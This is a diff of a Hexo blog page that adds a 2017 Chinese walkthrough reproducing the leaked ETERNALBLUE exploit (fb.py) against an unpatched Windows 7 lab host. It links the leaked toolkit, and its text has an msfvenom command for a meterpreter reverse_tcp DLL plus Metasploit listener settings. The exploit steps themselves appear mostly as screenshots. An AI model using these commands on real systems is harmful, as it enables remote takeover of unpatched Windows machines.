@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="0day," />
 
 
 
@@ -87,15 +87,34 @@
 
 
 
-<meta name="description" content="心有猛虎，细嗅蔷薇.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="果酱's Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="0x01.环境简介  攻击机win2003ip:192.168.1.105攻击机kali:ip:192.168.1.106靶机（被攻击机）window7 x64(未装smb漏洞补丁）ip:192.168.1.100 0x02.windows2003攻击机  攻击机win2003安装环境：">
+<meta name="keywords" content="0day">
+<meta property="og:type" content="article">
+<meta property="og:title" content="方程式ETERNALBLUE 之fb.py的复现">
+<meta property="og:url" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE 之fb.py的复现/index.html">
 <meta property="og:site_name" content="果酱's Blog">
-<meta property="og:description" content="心有猛虎，细嗅蔷薇.">
+<meta property="og:description" content="0x01.环境简介  攻击机win2003ip:192.168.1.105攻击机kali:ip:192.168.1.106靶机（被攻击机）window7 x64(未装smb漏洞补丁）ip:192.168.1.100 0x02.windows2003攻击机  攻击机win2003安装环境：">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/1.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/2.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/3.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/4.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/5.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/6.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/7.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/8.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/9.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/10.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/19.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/12.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/15.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/16.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/17.png">
+<meta property="og:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/18.png">
+<meta property="og:updated_time" content="2017-04-19T08:22:01.659Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="果酱's Blog">
-<meta name="twitter:description" content="心有猛虎，细嗅蔷薇.">
+<meta name="twitter:title" content="方程式ETERNALBLUE 之fb.py的复现">
+<meta name="twitter:description" content="0x01.环境简介  攻击机win2003ip:192.168.1.105攻击机kali:ip:192.168.1.106靶机（被攻击机）window7 x64(未装smb漏洞补丁）ip:192.168.1.100 0x02.windows2003攻击机  攻击机win2003安装环境：">
+<meta name="twitter:image" content="http://yoursite.com/2017/04/16/方程式ETERNALBLUE%20之fb.py的复现/img/1.png">
 
 
 
@@ -123,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/04/16/方程式ETERNALBLUE 之fb.py的复现/"/>
 
 
 
 
 
-  <title> 果酱's Blog </title>
+  <title> 方程式ETERNALBLUE 之fb.py的复现 | 果酱's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -154,9 +173,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-   page-home 
- ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -239,9 +256,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -271,10 +288,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2017/04/16/方程式ETERNALBLUE 之fb.py的复现/" itemprop="url">
-                  方程式ETERNALBLUE 之fb.py的复现
-                </a>
+                方程式ETERNALBLUE 之fb.py的复现
               
             
           </h1>
@@ -336,55 +350,88 @@
       
 
       
-        
-          <h1>0x01.环境简介</h1>
+        <h1>0x01.环境简介</h1>
 
 <p>攻击机win2003<br>ip:192.168.1.105<br>攻击机kali:<br>ip:192.168.1.106<br>靶机（被攻击机）window7 x64(未装smb漏洞补丁）<br>ip:192.168.1.100</p>
 <h1>0x02.windows2003攻击机</h1>
 
-<p>攻击机win2003安装环境：<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/04/16/方程式ETERNALBLUE 之fb.py的复现/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+<p>攻击机win2003安装环境：<br><a id="more"></a><br>python-2.6.6.msi<br><a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="external">https://www.python.org/download/releases/2.6.6/</a><br>pywin32-221.win-amd64-py2.6.exe：<br><a href="https://sourceforge.net/projects" target="_blank" rel="external">https://sourceforge.net/projects</a> … ywin32/Build%20221/<br>方程式ETERNALBLUE 下载地址：<br><a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="external">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
+<p>安装好python后，需要在win2003设置环境变量：</p>
+<p><img src="img\1.png"></p>
+<p>将整个ETERNALBLUE 目录下的 windows拷贝到攻击机win2003上</p>
+<p><img src="img\2.png"></p>
+<p>在windows目录下建立一个文件为：listeningposts</p>
+<p>运行phthon  fb.py</p>
+<p>以下在攻击机win2003上执行fb.py的具体命令重要命令如下，其他命令都用回车执行。</p>
+<p><img src="img\3.png"></p>
+<p><img src="img\4.png"></p>
+<p><img src="img\5.png"></p>
+<p><img src="img\6.png"></p>
+<p><img src="img\7.png"></p>
+<h1>0x03.攻击机kali上</h1>
+
+<p>利用msf生成一个dll劫持文件：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.131 LPORT=5555 -f dll &gt; /opt/s.dll</p>
+<p><img src="img\8.png"></p>
+<p>将s.dll文件拷贝到windows2003的C盘目录下：<br><img src="img\9.png"><br>在msf下开启msfpaylod监听：<br>use exploit/multi/handler<br>set lhost 192.168.1.106<br>set lport 5555<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>exploit</p>
+<p><img src="img\10.png"></p>
+<h1>0x04.接着在windows2003下执行</h1>
+
+<p><img src="img\19.png"><br><img src="img\12.png"></p>
+<p><img src="img\15.png"><br><img src="img\16.png"><br><img src="img\17.png"></p>
+<p>最后在msf下可以看到成功反弹shell:</p>
+<p><img src="img\18.png"></p>
+<p></p><h1>doc文档</h1><br>链接：<a href="http://pan.baidu.com/s/1bo2tHuv" target="_blank" rel="external">http://pan.baidu.com/s/1bo2tHuv</a> 密码：hq47<p></p>
+
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <div>
+      
+        
+
       
     </div>
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/0day/" rel="tag"># 0day</a>
+          
+        </div>
+      
+
+      
+        
+      
 
       
 
       
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -392,6 +439,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -411,8 +469,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
@@ -465,6 +532,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">0x01.环境简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">0x02.windows2003攻击机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">0x03.攻击机kali上</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">0x04.接着在windows2003下执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">doc文档</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -562,6 +645,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
@@ -579,6 +666,18 @@
       <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2017/04/16/方程式ETERNALBLUE 之fb.py的复现/';
+          this.page.identifier = '2017/04/16/方程式ETERNALBLUE 之fb.py的复现/';
+          this.page.title = '方程式ETERNALBLUE 之fb.py的复现';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
